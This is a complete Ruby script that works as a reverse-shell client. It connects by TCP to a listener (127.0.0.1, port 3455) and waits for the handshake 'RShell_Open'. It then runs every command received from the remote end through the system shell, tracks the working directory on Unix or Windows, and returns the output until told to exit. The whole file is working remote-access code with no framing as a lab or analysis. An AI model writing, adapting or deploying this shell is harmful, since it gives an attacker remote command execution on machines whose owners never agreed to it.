require "socket"

host = "127.0.0.1"
port = 3455
host = TCPSocket.open(host, port)
x = host.gets.chomp
if x == "RShell_Open"
	if system("pwd")
		currentDirCommand = "pwd"
		joiner = "\; "
	elsif system("cd")
		currentDirCommand = "cd"
		joiner = "\& "
	end
	currentDir = `#{currentDirCommand}`.chomp
	host.puts currentDirCommand
	loop do
		cmd = host.gets.chomp
		if cmd.downcase == "exit"
			host.close
			break
		else
			begin
				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
					currentDir = `#{cmd}#{joiner}#{currentDirCommand}`.chomp
				end
				out = `cd "#{currentDir}"#{joiner}#{cmd.chomp}`
			rescue
				out = "Unable to execute command"
			end
			host.puts out.gsub("\n", "\\NEWLINE")
		end
	end
else
	host.close
end